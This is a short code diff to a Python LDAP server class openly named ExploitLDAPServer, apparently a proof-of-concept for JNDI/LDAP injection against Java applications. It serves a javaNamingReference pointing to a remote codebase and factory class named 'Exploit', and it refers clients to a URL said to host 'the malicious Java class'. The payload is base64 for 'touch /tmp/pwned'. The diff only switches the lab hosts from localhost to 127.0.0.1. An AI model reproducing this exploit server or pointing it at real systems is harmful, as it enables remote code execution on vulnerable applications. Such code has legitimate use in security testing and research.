@@ -61,7 +61,7 @@ class ExploitLDAPServer(ldapserver.LDAPServer):
             attributes=[
                     ('mail', [b'touch /tmp/pwned.txt']),
                     ('javaClassName', [b'foo']),
-                    ('javaCodeBase', [b'http://localhost:8080/']),
+                    ('javaCodeBase', [b'http://127.0.0.1:8001/']),
                     ('objectClass', [b'javaNamingReference']),
                     ('javaFactory', [b'Exploit'])
                 ]
@@ -71,7 +71,7 @@ class ExploitLDAPServer(ldapserver.LDAPServer):
         
         # Redirect the client to the URL hosting the malicious Java class
         base64_payload="dG91Y2ggL3RtcC9wd25lZA=="
-        referral_url = f'ldap://localhost:8080/exploit?o={base64_payload}'
+        referral_url = f'ldap://127.0.0.1:8080/exploit?o={base64_payload}'
         reference = pureldap.LDAPSearchResultReference(uris=[referral_url.encode()])
         reply(reference)
 
